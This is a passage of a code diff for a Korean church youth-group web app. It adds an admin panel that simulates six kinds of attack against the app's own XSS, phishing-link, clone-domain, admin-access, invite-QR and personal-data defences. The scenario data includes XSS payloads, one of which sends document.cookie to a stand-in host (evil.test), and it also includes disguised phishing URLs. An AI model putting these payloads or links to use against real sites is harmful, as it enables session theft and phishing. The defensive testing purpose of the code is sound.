@@ -8,13 +8,13 @@
   <title>라이트 청년부</title>
 
   <!-- PWA 필수 설정 -->
-  <link rel="manifest" href="./manifest.json?v=205" />
+  <link rel="manifest" href="./manifest.json?v=206" />
   <meta name="theme-color" content="#0B0F19" />
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
   <meta name="apple-mobile-web-app-title" content="라이트 청년부" />
-  <link rel="apple-touch-icon" href="./icon-192.png?v=205" />
-  <link rel="icon" type="image/png" href="./icon-192.png?v=205" />
+  <link rel="apple-touch-icon" href="./icon-192.png?v=206" />
+  <link rel="icon" type="image/png" href="./icon-192.png?v=206" />
 
   <!-- Firebase SDK (Auth + Firestore Compat · 로컬 자체 보관) -->
   <script src="./firebase-app-compat.js"></script>
@@ -2925,6 +2925,41 @@
       word-break: break-all;
       font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
     }
+    .sec-sim-payload {
+      background: #0F172A;
+      color: #FCA5A5;
+      border: 1px solid rgba(248, 113, 113, 0.35);
+      border-radius: 11px;
+      padding: 10px 12px;
+      margin: 6px 0 10px;
+      font-size: 12px;
+      line-height: 1.5;
+      word-break: break-all;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    }
+    .sec-sim-step {
+      border-radius: 11px;
+      padding: 9px 11px;
+      margin-bottom: 7px;
+      font-size: 12px;
+      line-height: 1.5;
+      border: 1px solid var(--border);
+      background: #F8FAFC;
+      color: #1E293B;
+    }
+    .sec-sim-step.ok { background: #ECFDF5; border-color: #6EE7B7; color: #065F46; }
+    .sec-sim-step.warn { background: #FFFBEB; border-color: #FCD34D; color: #92400E; }
+    .sec-sim-step.err { background: #FEF2F2; border-color: #FCA5A5; color: #991B1B; }
+    .sec-sim-step-title { font-weight: 800; margin-bottom: 2px; display: flex; align-items: center; justify-content: space-between; gap: 6px; flex-wrap: wrap; }
+    .sec-sim-preview {
+      border-radius: 12px;
+      padding: 11px 12px;
+      margin: 8px 0 10px;
+      border: 1.5px dashed #CBD5E1;
+      background: #FFFFFF;
+      font-size: 12px;
+      line-height: 1.5;
+    }
 
     /* ==================== v10.53 점검 주의/경고 원인·해결 안내 박스 스타일 ==================== */
     .check-advice-box {
@@ -3528,7 +3563,7 @@
 
     <!-- 인앱 실시간 알림 팝업 배너 -->
     <div id="inAppNotif" class="inapp-notif" onclick="handleInAppNotifClick()">
-      <div id="inAppNotifIcon" class="inapp-notif-icon"><img src="./icon-192.png?v=205" alt="라이트 청년부" /></div>
+      <div id="inAppNotifIcon" class="inapp-notif-icon"><img src="./icon-192.png?v=206" alt="라이트 청년부" /></div>
       <div style="min-width:0; flex:1;">
         <div id="inAppNotifTitle" class="inapp-notif-title">새 알림</div>
         <div id="inAppNotifBody" class="inapp-notif-body"></div>
@@ -5202,7 +5237,7 @@
 
     const ADMIN_EMAIL = 'admin@right-youth.app';
     const CURRENT_SCHEMA_VERSION = 30;
-    const APP_CLIENT_BUILD = 205;
+    const APP_CLIENT_BUILD = 206;
     const KEY_LAST_SEC_WATCH_SIG = 'right_youth_sec_watch_sig_v1';
     const KEY_AUTO_SEC_LAST_ALERT_SIG = 'right_youth_auto_sec_alert_sig_v1';
     const KEY_AUTO_DIAG_LAST_ALERT_SIG = 'right_youth_auto_diag_alert_sig_v1';
@@ -6122,7 +6157,7 @@
     function showInAppNotif(icon, title, body, onClickAction, variant = '') {
       document.getElementById('inAppNotifIcon').innerHTML = variant === 'sec-alert'
         ? '<span style="font-size:21px;">🚨</span>'
-        : '<img src="./icon-192.png?v=205" alt="라이트 청년부" />';
+        : '<img src="./icon-192.png?v=206" alt="라이트 청년부" />';
       document.getElementById('inAppNotifTitle').textContent = title;
       document.getElementById('inAppNotifBody').textContent = body;
       inAppNotifAction = onClickAction || null;
@@ -6146,8 +6181,8 @@
 
     async function sendDeviceNotification(title, body, fixedTag = '') {
       if (getNotifPermissionState() !== 'granted') return false;
-      const iconUrl = new URL('./icon-192.png?v=205', window.location.href).href;
-      const badgeUrl = new URL('./badge-96.png?v=205', window.location.href).href;
+      const iconUrl = new URL('./icon-192.png?v=206', window.location.href).href;
+      const badgeUrl = new URL('./badge-96.png?v=206', window.location.href).href;
       const notifTag = fixedTag ? `right-youth-${fixedTag}` : ('right-youth-' + Date.now());
       try {
         if (swRegistration && typeof swRegistration.showNotification === 'function') {
@@ -10667,14 +10702,15 @@
           category: catMap.sec_log,
           icon: getTabIcon('manageSecurity'),
           title: `8. ${getTabLabel('manageSecurity')} (해킹 · 피싱 · 악성 링크 점검 및 실시간 방어)`,
-          sub: '피싱 링크 차단, 복제 도메인 감지, XSS 차단, 11개 보안 진단 및 실시간 자동 감시',
-          keywords: `${getTabLabel('manageSecurity')} 보안 점검 해킹 피싱 스미싱 악성 링크 단축 URL 복제 도메인 XSS 도배 차단 자동 점검 개인정보`,
+          sub: '11개 보안 진단, 실시간 자동 감시, 방어 설정 및 6종 해킹·피싱 방어 시뮬레이션',
+          keywords: `${getTabLabel('manageSecurity')} 보안 점검 해킹 피싱 스미싱 악성 링크 단축 URL 복제 도메인 XSS 도배 차단 자동 점검 개인정보 시뮬레이션 모의 공격`,
           targetTab: 'security',
           targetLabel: `${getTabIcon('manageSecurity')} ${getTabLabel('manageSecurity')} 탭 열기`,
           steps: [
             `<b>11개 항목 수동·자동 보안 일괄 점검 ([${secIcn} ${secLbl}]):</b> 공식 HTTPS 도메인, CSP·로컬 SDK 무결성, 전체 링크·XSS·개인정보 노출 스캔, 관리자 잠금·비공개 서버 격리·참관자 권한, QR·비번 초기화 만료, 유튜브 채널·방어 정책·저장소 보안을 한 번에 점검합니다.`,
             '<b>실시간 자동 보안 점검:</b> 원하는 주기(초)를 설정해 두면 백그라운드에서 자동 점검하다가 문제 감지 시 즉시 멈추고 최고 관리자에게 알림을 보내며, 해결되면 자동으로 재개합니다.',
             '<b>실시간 방어 스위치 & 관리자 전용 보안 알림:</b> 악성 스크립트(XSS) 차단, 피싱·위험 링크 자동 차단, 복제 사이트 경고와 <b>🚨 보안 문제 발생 시 관리자 실시간 알림</b>을 켜고 끌 수 있습니다. (보안 알림은 최고 관리자에게만 표시)',
+            '<b>6종 해킹·피싱 공격 방어 시뮬레이션:</b> XSS 스크립트, 피싱 링크, 복제 도메인, 관리자 권한 탈취, 만료·위조 QR 가입, 악성 유튜브·개인정보 노출 공격 시 실제 앱 방어 엔진이 몇 단계로 어떻게 차단하고 대처하는지 데이터·로그 오염 없이 모의 체험할 수 있습니다.',
             `<b>기능 점검과 역할 분리:</b> 앱 오류·연동·화면 체험은 <b>[${diagIcn} ${diagLbl}]</b>에서, 해킹·피싱·보안 방어는 <b>[${secIcn} ${secLbl}]</b>에서 각각 전문적으로 점검합니다.`
           ],
           tip: `악성 스크립트나 피싱 링크 입력이 차단되면 실행자·시각·시도 내용이 [${getTabIcon('manageLogs')} ${getTabLabel('manageLogs')}]에 자동 기록되어 추적할 수 있습니다.`
@@ -11175,7 +11211,7 @@
     };
 
     // ==================== 12. 관리 센터 ====================
-    const OBSERVER_ALLOWED_ONCLICK_RE = /^(?:event\.stopPropagation\(\);\s*)?(?:toggleManageSection|collapseManageSectionAndScroll|switchManageSubTab|setManageContentFilter|setManageAdminsFilter|setManageMembersFilter|setManageVideosFilter|setManageWorshipFilter|setManageSheetFilter|setManageSecurityFilter|setManageDiagnosticsFilter|setManageQrFilter|setManageAdminCodeFilter|setManageLabelsFilter|selectRoleMemberTab|toggleAllRolesEditor|setAdminLogFilter|setAdminLogCategoryFilter|setAdminGuideCategory|setAdminInquiryFilter|setWorshipAttStatusFilter|shiftAttRosterCalMonth|selectAttRosterDate|jumpAttRosterToday|selectAttRosterSession|setAttRosterFilter|clearAttRosterSearch|jumpAttRosterToIso|clearAttRosterQuickJump|clearRoleMemberSearch|clearAdminLogSearch|clearAdminGuideSearch|openYouTubeVideoSafely|openExternalLinkSafely|openInviteQrModal|copyInviteQrLink|switchMainTab)\s*\(/;
+    const OBSERVER_ALLOWED_ONCLICK_RE = /^(?:event\.stopPropagation\(\);\s*)?(?:toggleManageSection|collapseManageSectionAndScroll|switchManageSubTab|setManageContentFilter|setManageAdminsFilter|setManageMembersFilter|setManageVideosFilter|setManageWorshipFilter|setManageSheetFilter|setManageSecurityFilter|setManageDiagnosticsFilter|setManageQrFilter|setManageAdminCodeFilter|setManageLabelsFilter|selectRoleMemberTab|toggleAllRolesEditor|setAdminLogFilter|setAdminLogCategoryFilter|setAdminGuideCategory|setAdminInquiryFilter|setWorshipAttStatusFilter|shiftAttRosterCalMonth|selectAttRosterDate|jumpAttRosterToday|selectAttRosterSession|setAttRosterFilter|clearAttRosterSearch|jumpAttRosterToIso|clearAttRosterQuickJump|clearRoleMemberSearch|clearAdminLogSearch|clearAdminGuideSearch|openYouTubeVideoSafely|openExternalLinkSafely|openInviteQrModal|copyInviteQrLink|openSecSimModal|selectSecSimVariant|runAllSecSimulations|switchMainTab)\s*\(/;
     const OBSERVER_ALLOWED_INPUT_IDS = new Set([
       'roleMemberSearchInput', 'adminLogSearchInput', 'adminGuideSearchInput', 'attRosterSearchInput', 'attRosterQuickJumpInput'
     ]);
@@ -22810,8 +22846,8 @@
     }
 
     window.setManageSecurityFilter = (f) => {
-      manageSecurityFilter = ['all', 'checks', 'defense', 'threats'].includes(f) ? f : 'all';
-      const accMap = { checks: 'sec_check_list', defense: 'sec_defense_cfg', threats: 'sec_threat_feed' };
+      manageSecurityFilter = ['all', 'checks', 'defense', 'sim', 'threats'].includes(f) ? f : 'all';
+      const accMap = { checks: 'sec_check_list', defense: 'sec_defense_cfg', sim: 'sec_sim', threats: 'sec_threat_feed' };
       if (accMap[manageSecurityFilter]) manageSectionOpen[accMap[manageSecurityFilter]] = true;
       const u = getCurrentUser();
       if (u && currentMainTab === 'manage' && currentManageSubTab === 'security') {
@@ -22831,9 +22867,11 @@
       const secf = manageSecurityFilter || 'all';
       const showChecks = secf === 'all' || secf === 'checks';
       const showDefense = secf === 'all' || secf === 'defense';
+      const showSim = secf === 'all' || secf === 'sim';
       const showThreats = secf === 'all' || secf === 'threats';
       const defenseOpen = isManageSectionOpen('sec_defense_cfg', true);
       const checksOpen = isManageSectionOpen('sec_check_list', true);
+      const simOpen = isManageSectionOpen('sec_sim', true);
       const threatsOpen = isManageSectionOpen('sec_threat_feed', (unackedThreatLogs.length > 0 && unackedThreatLogs.length <= 5) || secf === 'threats');
 
       el.innerHTML = `
@@ -22916,6 +22954,7 @@
           <button class="filter-chip ${secf === 'all' ? 'active' : ''}" type="button" onclick="setManageSecurityFilter('all')">전체</button>
           <button class="filter-chip ${secf === 'checks' ? 'active' : ''}" type="button" onclick="setManageSecurityFilter('checks')">🔍 ${SEC_CHECK_ITEMS.length}개 보안 진단</button>
           <button class="filter-chip ${secf === 'defense' ? 'active' : ''}" type="button" onclick="setManageSecurityFilter('defense')">🚧 실시간 방어</button>
+          <button class="filter-chip ${secf === 'sim' ? 'active' : ''}" type="button" onclick="setManageSecurityFilter('sim')">🎭 공격 시뮬레이션 (6)</button>
           <button class="filter-chip ${secf === 'threats' ? 'active' : ''}" type="button" onclick="setManageSecurityFilter('threats')">🚨 위협 기록 (${unackedThreatLogs.length > 0 ? `미확인 ${unackedThreatLogs.length}` : threatLogs.length})</button>
         </div>
 
@@ -22991,11 +23030,64 @@
 
         ` : ''}
 
+        ${showSim ? `
+        <!-- 3) 해킹 · 피싱 공격 방어 시뮬레이션 -->
+        ${buildManageAccordionBar({
+          key: 'sec_sim',
+          marginTop: (showChecks || showDefense) ? '10px' : '',
+          titleHtml: '🎭 해킹 · 피싱 공격 방어 시뮬레이션',
+          badgeHtml: '<span class="tag green">안전 모의훈련</span>',
+          defaultOpen: true
+        })}
+        <div data-acc-body="sec_sim" class="${simOpen ? '' : 'hidden'}">
+          <div class="info-box" style="margin-top:0; margin-bottom:9px;">
+            실제 해킹·피싱·무단 접근 공격이 들어왔을 때 <b>내 앱의 실제 방어 엔진과 현재 보안 설정</b>이 몇 단계로 어떻게 차단·대처하는지 모의 실행해 볼 수 있습니다.<br>
+            <span style="color:#64748B;">※ 100% 안전한 모의훈련이며 실제 데이터 저장·감사 로그 오염·알림 발송은 발생하지 않습니다.</span>
+          </div>
+          <button class="btn-full btn-dark" type="button" style="padding:11px; font-size:13px; margin-bottom:9px;" onclick="runAllSecSimulations()">
+            🚀 전체 6종 공격 방어 일괄 모의 테스트
+          </button>
+          <div class="diag-sim-grid" style="margin-bottom:4px;">
+            <button class="diag-sim-btn" type="button" onclick="openSecSimModal('xss')">
+              <div style="font-size:18px; margin-bottom:4px;">💉</div>
+              <div style="font-size:13px; font-weight:800;">해킹 스크립트(XSS) 공격</div>
+              <div style="font-size:11px; color:#64748B; margin-top:2px;">&lt;script&gt;·onerror·쿠키 탈취 차단</div>
+            </button>
+            <button class="diag-sim-btn" type="button" onclick="openSecSimModal('phishing')">
+              <div style="font-size:18px; margin-bottom:4px;">🎣</div>
+              <div style="font-size:13px; font-weight:800;">피싱 · 위장 링크 공격</div>
+              <div style="font-size:11px; color:#64748B; margin-top:2px;">@ 위장·IP 직결·단축URL·퓨니코드</div>
+            </button>
+            <button class="diag-sim-btn" type="button" onclick="openSecSimModal('clone')">
+              <div style="font-size:18px; margin-bottom:4px;">🚨</div>
+              <div style="font-size:13px; font-weight:800;">복제 · 가짜 사이트 접속</div>
+              <div style="font-size:11px; color:#64748B; margin-top:2px;">유사 도메인·HTTP 가로채기 경고</div>
+            </button>
+            <button class="diag-sim-btn" type="button" onclick="openSecSimModal('admin_hijack')">
+              <div style="font-size:18px; margin-bottom:4px;">👑</div>
+              <div style="font-size:13px; font-weight:800;">관리자 탈취 · 무단 접근</div>
+              <div style="font-size:11px; color:#64748B; margin-top:2px;">코드 유출·참관자·서버 격리 방어</div>
+            </button>
+            <button class="diag-sim-btn" type="button" onclick="openSecSimModal('qr_brute')">
+              <div style="font-size:18px; margin-bottom:4px;">📲</div>
+              <div style="font-size:13px; font-weight:800;">만료·위조 QR 무단 가입</div>
+              <div style="font-size:11px; color:#64748B; margin-top:2px;">만료 토큰·조작 URL·가입 승인 잠금</div>
+            </button>
+            <button class="diag-sim-btn" type="button" onclick="openSecSimModal('yt_pii')">
+              <div style="font-size:18px; margin-bottom:4px;">🎬</div>
+              <div style="font-size:13px; font-weight:800;">악성 영상 · 개인정보 노출</div>
+              <div style="font-size:11px; color:#64748B; margin-top:2px;">위험 유튜브·주민번호·연락처 탐지</div>
+            </button>
+          </div>
+        </div>
+
+        ` : ''}
+
         ${showThreats ? `
-        <!-- 3) 최근 보안 위협 · 차단 이벤트 -->
+        <!-- 4) 최근 보안 위협 · 차단 이벤트 -->
         ${buildManageAccordionBar({
           key: 'sec_threat_feed',
-          marginTop: (showChecks || showDefense) ? '10px' : '',
+          marginTop: (showChecks || showDefense || showSim) ? '10px' : '',
           titleHtml: '🚨 최근 보안 위협 · 차단 기록',
           badgeHtml: `<span class="tag ${unackedThreatLogs.length > 0 ? 'red' : 'green'}">${unackedThreatLogs.length > 0 ? `미확인 ${unackedThreatLogs.length}건` : (threatLogs.length > 0 ? `모두 확인됨 (${threatLogs.length}건)` : '0건')}</span>`,
           actionHtml: `${unackedThreatLogs.length > 0 ? '<button class="btn-sm approve" type="button" onclick="handleAcknowledgeSecurityThreats()">✅ 모두 확인 완료</button> ' : ''}<button class="btn-sm primary" type="button" onclick="switchManageSubTab('logs')">${escapeHtml(getTabLabel('manageLogs'))} 보기</button>`,
@@ -23918,6 +24010,641 @@
       }
     };
 
+
+    // ==================== 해킹 · 피싱 공격 방어 시뮬레이션 엔진 (100% 무해 모의훈련) ====================
+    const SEC_SIM_SCENARIOS = {
+      xss: {
+        id: 'xss',
+        icon: '💉',
+        title: '해킹 스크립트(XSS) 삽입 공격',
+        subtitle: '공지·문의·영상 추천글 등에 악성 자바스크립트를 숨겨 다른 이용자 계정을 노리는 공격',
+        variants: [
+          {
+            label: '<script> 태그 삽입',
+            context: '문의 사항 · 공지 본문 입력란',
+            payload: '<scr' + 'ipt>alert("계정 탈취 테스트")</scr' + 'ipt>'
+          },
+          {
+            label: '이미지 onerror 쿠키 탈취',
+            context: '영상 추천 한마디 입력란',
+            payload: '<img src=x onerror="fetch(\'https://evil.test/?c=\'+document.cookie)">'
+          },
+          {
+            label: 'javascript: 강제 이동',
+            context: '바로가기 · 게시물 입력란',
+            payload: 'javascript:window.location="https://fake-login.test"'
+          }
+        ]
+      },
+      phishing: {
+        id: 'phishing',
+        icon: '🎣',
+        title: '피싱 · 스미싱 · 위장 링크 공격',
+        subtitle: '교회·선물 안내 등으로 속여 가짜 사이트로 유도하는 악성 URL 등록·클릭 공격',
+        variants: [
+          {
+            label: '@ 기호 주소 위장',
+            context: '공지·문의·바로가기 URL 입력',
+            payload: 'https://gumi-jeil.church@198.51.100.77/login'
+          },
+          {
+            label: 'IP 숫자 서버 직결',
+            context: '문의 사항 · 외부 링크 등록',
+            payload: 'http://185.199.110.50/youth-event'
+          },
+          {
+            label: '단축 URL 스미싱',
+            context: '회원 문의·추천글 입력',
+            payload: 'https://bit.ly/free-gift-2026'
+          },
+          {
+            label: '유사문자 퓨니코드',
+            context: '바로가기·게시물 URL 입력',
+            payload: 'https://xn--gumi-church-fake.xyz/auth'
+          }
+        ]
+      },
+      clone: {
+        id: 'clone',
+        icon: '🚨',
+        title: '복제 · 가짜 피싱 사이트 접속 공격',
+        subtitle: '공식 주소와 비슷한 가짜 복제 사이트나 비암호화(HTTP) 환경으로 유도해 비밀번호를 훔치는 공격',
+        variants: [
+          {
+            label: '유사 오타 복제 도메인',
+            context: '공식 주소와 1글자 다른 가짜 링크 접속',
+            payload: 'https://kyutaek5347-github.io/youth-app/'
+          },
+          {
+            label: '비암호화 HTTP 가로채기',
+            context: '공공 와이파이 등 암호화 없는 HTTP 접속',
+            payload: 'http://kyutaek5347.github.io/youth-app/'
+          }
+        ]
+      },
+      admin_hijack: {
+        id: 'admin_hijack',
+        icon: '👑',
+        title: '관리자 권한 탈취 · 무단 접근 공격',
+        subtitle: '관리자 코드 유출 시 낯선 인물의 무단 로그인 또는 일반 회원·참관자의 관리자 데이터 탈취 시도',
+        variants: [
+          {
+            label: '유출된 코드로 낯선 이름 입장',
+            context: '관리자 로그인 화면 (미등록 성명 입력)',
+            payload: '성명: "외부침입자" + 유출된 관리자 코드 입력'
+          },
+          {
+            label: '일반 회원·참관자 서버 직접 수정/열람 시도',
+            context: '개발자 도구로 adminNotices·adminSecret·sheetSecret 직접 요청',
+            payload: 'db.collection("config").doc("adminSecret").get() / notices.delete()'
+          }
+        ]
+      },
+      qr_brute: {
+        id: 'qr_brute',
+        icon: '📲',
+        title: '만료·위조 초대 QR 무단 가입 공격',
+        subtitle: '외부인이 어제 찍어둔 QR이나 조작한 초대 링크로 청년부 앱에 무단 회원가입을 시도하는 공격',
+        variants: [
+          {
+            label: '유효시간이 지난 이전 QR 스캔',
+            context: '어제 또는 갱신 주기 만료 후 QR 재사용',
+            payload: 'https://kyutaek5347.github.io/youth-app/?invite=OLD_EXPIRED_TOKEN'
+          },
+          {
+            label: '임의 조작한 가짜 토큰 접속',
+            context: '주소창에 아무 문자열을 붙여 우회 시도',
+            payload: 'https://kyutaek5347.github.io/youth-app/?invite=FAKE9999HACK'
+          },
+          {
+            label: 'QR 없이 회원가입 직접 접근',
+            context: '앱 주소로 직접 들어와 회원가입 탭 클릭',
+            payload: 'https://kyutaek5347.github.io/youth-app/ (invite 파라미터 없음)'
+          }
+        ]
+      },
+      yt_pii: {
+        id: 'yt_pii',
+        icon: '🎬',
+        title: '악성 유튜브 · 민감 개인정보 노출',
+        subtitle: '비공식/위험 유튜브 영상 위장 등록 또는 문의·공지에 주민번호·전화번호·카드번호가 노출되는 상황',
+        variants: [
+          {
+            label: '저작권·위험 문구 포함 영상 등록',
+            context: '설교·CCM 유튜브 추천 화면',
+            payload: '제목: "인기 찬양 1시간 연속듣기 무료 다운로드 음원 추출"'
+          },
+          {
+            label: '유튜브 위장 피싱 링크 등록',
+            context: '유튜브 영상 URL 입력란',
+            payload: 'https://youtube-free-event.xyz/watch?v=dQw4w9WgXcQ'
+          },
+          {
+            label: '문의·공지에 민감 개인정보 입력',
+            context: '문의 사항 · 공지 본문',
+            payload: '연락처 010-1234-5678 / 주민번호 990101-1234567 / test@example.com'
+          }
+        ]
+      }
+    };
+
+    function evaluateSecSimScenario(scenarioId, variantIdx = 0) {
+      const sc = SEC_SIM_SCENARIOS[scenarioId] || SEC_SIM_SCENARIOS.xss;
+      const vIdx = Math.max(0, Math.min((sc.variants.length - 1), Number(variantIdx || 0)));
+      const variant = sc.variants[vIdx];
+      const cfg = securityConfig || DEFAULT_SECURITY_CONFIG;
+      const officialHost = String(cfg.officialHost || 'kyutaek5347.github.io').trim().toLowerCase();
+      const alertOn = cfg.alertAdminOnSecurityEvent !== false;
+      const logLbl = getTabLabel('manageLogs');
+      const admLbl = getTabLabel('manageAdmins');
+      const codeLbl = getTabLabel('manageAdminCode');
+
+      let overallStatus = 'ok'; // 'ok' | 'warn'
+      let overallBadge = '✅ 완전 방어 작동 중';
+      let steps = [];
+      let previewHtml = '';
+      let responseGuide = [];
+      let fixAction = null;
+
+      if (scenarioId === 'xss') {
+        const xssRes = detectMaliciousCode(variant.payload);
+        const escapedOut = escapeHtml(variant.payload);
+        const blockOn = cfg.blockMaliciousInput !== false;
+        const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+        const cspContent = cspMeta ? (cspMeta.getAttribute('content') || '') : '';
+        const cspStrong = cspContent.includes("object-src 'none'") && cspContent.includes("script-src 'self'");
+
+        if (!blockOn) {
+          overallStatus = 'warn';
+          overallBadge = '⚠️ 1차 입력 차단 OFF (2·3차 방어만 작동)';
+          fixAction = { label: '🛡️ 핵심 방어 즉시 켜기', type: 'enable_core_defense' };
+        }
+
+        steps = [
+          {
+            status: blockOn ? 'ok' : 'warn',
+            title: `1단계 · 실시간 입력 차단 (${blockOn ? 'ON · 즉시 차단' : 'OFF · 보강 필요'})`,
+            badge: blockOn ? '차단됨' : '꺼짐',
+            body: blockOn
+              ? `실제 탐지 엔진(detectMaliciousCode)이 [${xssRes.reasons.join(', ')}](패턴: ${xssRes.matched})을 즉시 잡아내어 서버(Firestore) 저장 자체를 거부합니다.`
+              : `탐지 엔진은 위험 패턴(${xssRes.matched})을 인식하지만, 현재 [악성 스크립트 입력 차단] 스위치가 꺼져 있어 1차 저장 거부가 비활성화되어 있습니다.`
+          },
+          {
+            status: 'ok',
+            title: '2단계 · 출력 무력화 (escapeHtml 항상 작동)',
+            badge: '무력화 완료',
+            body: `만약 저장소에 코드가 들어가더라도 화면 출력 시 <, >, ", ' 문자를 모두 일반 텍스트로 치환해 브라우저가 코드로 절대 실행하지 못하게 막습니다.`
+          },
+          {
+            status: cspStrong ? 'ok' : 'warn',
+            title: '3단계 · 브라우저 CSP 보안 헤더 차단',
+            badge: cspStrong ? '정상 적용' : '점검 필요',
+            body: cspStrong
+              ? "페이지 상단 CSP 정책(script-src 'self' · object-src 'none')이 외부 해킹 스크립트 로딩과 플러그인 실행을 브라우저 수준에서 원천 차단합니다."
+              : 'CSP 메타 태그 옵션을 2번 보안 진단에서 점검해 주세요.'
+          },
+          {
+            status: alertOn ? 'ok' : 'warn',
+            title: `4단계 · 감사 로그 영구 기록 & 관리자 알림 (${alertOn ? 'ON' : 'OFF'})`,
+            badge: alertOn ? '자동 추적' : '알림 꺼짐',
+            body: `[${logLbl}]에 '악성 입력 시도 차단'(실행자·시각·위치·감지 패턴)이 삭제 불가 형태로 기록되고${alertOn ? ', 최고 관리자에게 즉시 빨간 보안 경고가 전송됩니다.' : ' (현재 관리자 보안 알림은 꺼져 있습니다).'}`
+          }
+        ];
+
+        previewHtml = `
+          <div style="font-size:11px; font-weight:800; color:#64748B; margin-bottom:6px;">👁️ 실제 발생 시 화면 반응</div>
+          <div style="background:#0F172A; color:#FDE68A; border-radius:9px; padding:8px 10px; font-size:11.5px; margin-bottom:7px;">
+            <b>[공격자 화면 토스트]</b> 🛡️ 보안 차단: 악성 스크립트 패턴이 감지되어 등록이 차단되었습니다.
+          </div>
+          <div style="background:#F8FAFC; border:1px solid #CBD5E1; border-radius:9px; padding:8px 10px; font-size:11px; color:#334155;">
+            <b>[2차 출력 무력화 결과 — 실행되지 않는 일반 글자]</b><br>
+            <code style="word-break:break-all; color:#0F172A;">${escapeHtml(escapedOut)}</code>
+          </div>
+        `;
+
+        responseGuide = [
+          `[${logLbl}] 또는 [🚨 최근 보안 위협 · 차단 기록]에서 시도한 계정 이름과 위치를 확인합니다.`,
+          '반복적인 악성 입력을 시도하는 외부 침입 계정이라면 [👥 회원 승인]에서 즉시 내보내기(차단) 처리합니다.',
+          '만약 관리자 계정에서 알 수 없는 시도가 발생했다면 즉시 [🔐 관리자 코드]를 변경하고 [👑 관리자] 명단을 점검합니다.'
+        ];
+      } else if (scenarioId === 'phishing') {
+        const urlRes = analyzeUrlRisk(variant.payload);
+        const blockOn = cfg.blockSuspiciousLinks !== false;
+        const isDanger = urlRes.riskLevel === 'danger';
+
+        if (!blockOn) {
+          overallStatus = 'warn';
+          overallBadge = '⚠️ 피싱 링크 차단 스위치 OFF';
+          fixAction = { label: '🛡️ 핵심 방어 즉시 켜기', type: 'enable_core_defense' };
+        }
+
+        steps = [
+          {
+            status: blockOn ? 'ok' : 'warn',
+            title: `1단계 · URL 위험도 정밀 분석 (${isDanger ? '🚨 고위험(danger)' : '⚠️ 주의(warn)'})`,
+            badge: blockOn ? '실시간 탐지' : '스위치 꺼짐',
+            body: `실제 분석 엔진(analyzeUrlRisk)이 대상 호스트 [${urlRes.host || '알 수 없음'}]에서 [${urlRes.reasons.join(', ')}] 위험 요소를 즉시 검출했습니다.`
+          },
+          {
+            status: blockOn ? 'ok' : 'warn',
+            title: '2단계 · 입력·등록 단계 차단 (enforceInputSecurity)',
+            badge: blockOn ? (isDanger ? '전원 즉시 차단' : '회원 차단 · 관리자 확인') : '차단 꺼짐',
+            body: !blockOn
+              ? '현재 [피싱 · 위험 링크 자동 차단] 스위치가 꺼져 있어 입력 차단이 작동하지 않습니다.'
+              : (isDanger
+                ? '고위험 피싱 링크로 판정되어 회원·관리자 구분 없이 즉시 경고창을 띄우고 저장을 원천 차단합니다.'
+                : '일반 회원은 단축 URL·비암호화(HTTP) 등록이 즉시 차단되며, 관리자에게는 위험 안내 확인창을 띄워 실수 등록을 방지합니다.')
+          },
+          {
+            status: 'ok',
+            title: '3단계 · 클릭 이동 시 이중 방어 (openExternalLinkSafely)',
+            badge: isDanger ? '이동 차단' : '도메인 경고창',
+            body: isDanger
+              ? '이미 저장된 링크를 클릭하더라도 이동 직전에 위험 주소로 판정되어 브라우저 열기를 차단합니다.'
+              : '안전하지 않은 링크 클릭 시 실제 이동 도메인과 주의 사유를 경고창으로 먼저 띄워 확인하도록 보호합니다.'
+          },
+          {
+            status: alertOn ? 'ok' : 'warn',
+            title: `4단계 · 위협 기록 및 관리자 알림 (${alertOn ? 'ON' : 'OFF'})`,
+            badge: alertOn ? '실시간 알림' : '알림 꺼짐',
+            body: `[${logLbl}]에 '피싱·위험/의심 링크 차단'과 감지 주소가 기록되고, 3번 보안 진단(전체 링크 스캔)이 기존 게시물까지 수시로 재검사합니다.`
+          }
+        ];
+
+        previewHtml = `
+          <div style="font-size:11px; font-weight:800; color:#64748B; margin-bottom:6px;">👁️ 실제 발생 시 경고·차단 화면</div>
+          <div style="background:#FEF2F2; border:1px solid #FCA5A5; border-radius:10px; padding:9px 11px; color:#991B1B; font-size:11.5px; line-height:1.5;">
+            <b>🚨 보안 차단: ${isDanger ? '피싱 또는 위험 링크가 감지되어 등록할 수 없습니다.' : '보안 정책으로 의심 링크는 등록할 수 없습니다.'}</b><br>
+            • 감지 주소: <code>${escapeHtml(urlRes.url || variant.payload)}</code><br>
+            • 사유: ${escapeHtml(urlRes.reasons.join(', '))}
+          </div>
+        `;
+
+        responseGuide = [
+          '단축 URL(bit.ly 등) 대신 원본 공식 HTTPS 주소(instagram.com, youtube.com 등)만 사용하도록 안내합니다.',
+          '만약 이미 게시된 글에 의심 링크가 남아 있다면 3번 보안 진단의 바로가기 버튼으로 이동해 즉시 삭제합니다.',
+          '스미싱 링크를 반복 유포하는 계정은 [👥 회원 승인]에서 즉시 차단(내보내기)합니다.'
+        ];
+      } else if (scenarioId === 'clone') {
+        const detectOn = cfg.detectCloneDomain !== false;
+        let simParsed = null;
+        try { simParsed = new URL(variant.payload); } catch {}
+        const simHost = simParsed ? simParsed.hostname.toLowerCase() : 'unknown';
+        const simProto = simParsed ? simParsed.protocol.toLowerCase() : 'http:';
+        const issues = [];
+        if (simProto !== 'https:') issues.push('비암호화(HTTP) 연결');
+        if (simHost !== officialHost && !OFFICIAL_ALLOWED_HOSTS.includes(simHost)) issues.push(`비공식 도메인(${simHost})`);
+
+        if (!detectOn) {
+          overallStatus = 'warn';
+          overallBadge = '⚠️ 복제 도메인 경고 스위치 OFF';
+          fixAction = { label: '🛡️ 핵심 방어 즉시 켜기', type: 'enable_core_defense' };
+        }
+
+        steps = [
+          {
+            status: detectOn ? 'ok' : 'warn',
+            title: `1단계 · 접속 도메인·HTTPS 실시간 대조 (${detectOn ? 'ON' : 'OFF'})`,
+            badge: detectOn ? '즉시 감지' : '꺼짐',
+            body: `공식 허용 주소(${officialHost})와 현재 접속 주소(${simProto}//${simHost})를 비교해 [${issues.join(' · ')}] 이상을 즉시 판별합니다.`
+          },
+          {
+            status: detectOn ? 'ok' : 'warn',
